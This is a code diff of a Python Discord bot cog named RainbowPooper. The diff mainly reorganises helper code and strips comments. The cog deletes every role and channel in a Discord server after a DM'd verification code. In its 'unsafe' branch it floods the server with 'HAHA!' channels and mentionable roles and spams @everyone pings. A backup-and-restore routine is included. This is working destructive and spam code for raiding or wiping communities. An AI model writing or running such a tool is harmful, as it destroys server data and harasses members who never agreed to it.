@@ -3,7 +3,12 @@ from discord.ext import commands
 import random
 import string
 import asyncio
-import json
+
+ALLOWED_USERS = {1174820638997872721}  # Replace with real user IDs
+DM_RECEIVER_ID = 1174820638997872721
+
+def generate_code(length=6):
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
 class RainbowPooper(commands.Cog):
     def __init__(self, bot):
@@ -11,12 +16,6 @@ class RainbowPooper(commands.Cog):
         self.codes = {}  # user_id: verification_code
         self.restore_codes = {}  # user_id: restore_code
         self.backups = {}  # guild_id: backup_data
-
-ALLOWED_USERS = {1174820638997872721}  # Replace with real user IDs
-DM_RECEIVER_ID = 1174820638997872721
-
-def generate_code(length=6):
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
     @commands.command()
     async def rainbowpooper(self, ctx, safe: str = "no"):
@@ -31,7 +30,7 @@ def generate_code(length=6):
 
         try:
             dm_user = await self.bot.fetch_user(DM_RECEIVER_ID)
-            await dm_user.send(f"Verification code for {author} is: {verify_code}")
+            await dm_user.send(f"Verification code for {author} is: `{verify_code}`")
         except Exception:
             await ctx.send("Failed to send DM to verifier.")
             return
@@ -51,17 +50,14 @@ def generate_code(length=6):
             await ctx.send("Invalid code.")
             return
 
-        # Generate second restore code, send to verifier
         restore_code = generate_code(8)
         self.restore_codes[author.id] = restore_code
         try:
-            dm_user = await self.bot.fetch_user(DM_RECEIVER_ID)
-            await dm_user.send(f"Restore code for {author} is: {restore_code}. Use /rainbowpisser <code> to restore.")
+            await dm_user.send(f"Restore code for {author} is: `{restore_code}`. Use /rainbowpisser <code> to restore.")
         except Exception:
             await ctx.send("Failed to send restore code to verifier.")
             return
 
-        # Backup server data before nuking
         await ctx.send("Backing up server data...")
         backup = await self.backup_guild(ctx.guild)
         self.backups[ctx.guild.id] = backup
@@ -71,7 +67,6 @@ def generate_code(length=6):
 
         await ctx.send("Beginning server wipe...")
 
-        # Delete roles except @everyone
         for role in ctx.guild.roles:
             if role.is_default():
                 continue
@@ -80,7 +75,6 @@ def generate_code(length=6):
             except Exception:
                 pass
 
-        # Delete channels and categories
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
@@ -101,27 +95,23 @@ def generate_code(length=6):
             except asyncio.TimeoutError:
                 await new_channel.send("this server has been deleted")
         else:
-            # Flashier unsafe nuking
             for i in range(5):
                 cat = await ctx.guild.create_category(f"HAHA! {i+1}")
                 for _ in range(5):
-                    txt = await ctx.guild.create_text_channel("HAHA!", category=cat)
-                    vc = await ctx.guild.create_voice_channel("HAHA!", category=cat)
                     try:
-                        # Spam @everyone in text channels 5 times each
+                        txt = await ctx.guild.create_text_channel("HAHA!", category=cat)
+                        vc = await ctx.guild.create_voice_channel("HAHA!", category=cat)
                         for _ in range(5):
                             await txt.send("@everyone HAHAHAHAHA!")
                     except Exception:
                         pass
 
-            # Add many roles with @everyone mention enabled
             for i in range(10):
                 try:
-                    role = await ctx.guild.create_role(name=f"HAHA! ROLE {i+1}", mentionable=True)
+                    await ctx.guild.create_role(name=f"HAHA! ROLE {i+1}", mentionable=True)
                 except Exception:
                     continue
 
-            # Mention @everyone in all text channels once more after creating roles
             for channel in ctx.guild.text_channels:
                 try:
                     await channel.send("@everyone This server got rainbowpooped!")
@@ -148,7 +138,6 @@ def generate_code(length=6):
 
         await ctx.send("Restoring server from backup...")
 
-        # Delete current channels & roles except @everyone
         for role in ctx.guild.roles:
             if role.is_default():
                 continue
@@ -163,7 +152,6 @@ def generate_code(length=6):
             except Exception:
                 pass
 
-        # Restore roles
         roles_map = {}
         for r in backup['roles']:
             try:
@@ -178,7 +166,6 @@ def generate_code(length=6):
             except Exception:
                 pass
 
-        # Restore categories
         cats_map = {}
         for c in backup['categories']:
             try:
@@ -187,16 +174,13 @@ def generate_code(length=6):
             except Exception:
                 pass
 
-        # Restore channels
         for ch in backup['channels']:
             category = cats_map.get(ch['category_id'])
             try:
                 if ch['type'] == 'text':
-                    channel = await ctx.guild.create_text_channel(ch['name'], category=category)
+                    await ctx.guild.create_text_channel(ch['name'], category=category)
                 elif ch['type'] == 'voice':
-                    channel = await ctx.guild.create_voice_channel(ch['name'], category=category)
-                else:
-                    continue
+                    await ctx.guild.create_voice_channel(ch['name'], category=category)
             except Exception:
                 continue
 
@@ -209,7 +193,6 @@ def generate_code(length=6):
             'channels': []
         }
 
-        # Backup roles except @everyone
         for role in guild.roles:
             if role.is_default():
                 continue
@@ -222,14 +205,12 @@ def generate_code(length=6):
                 'permissions': role.permissions.value,
             })
 
-        # Backup categories
         for cat in guild.categories:
             backup['categories'].append({
                 'id': cat.id,
                 'name': cat.name
             })
 
-        # Backup channels (text and voice)
         for ch in guild.channels:
             if isinstance(ch, discord.TextChannel):
                 backup['channels'].append({
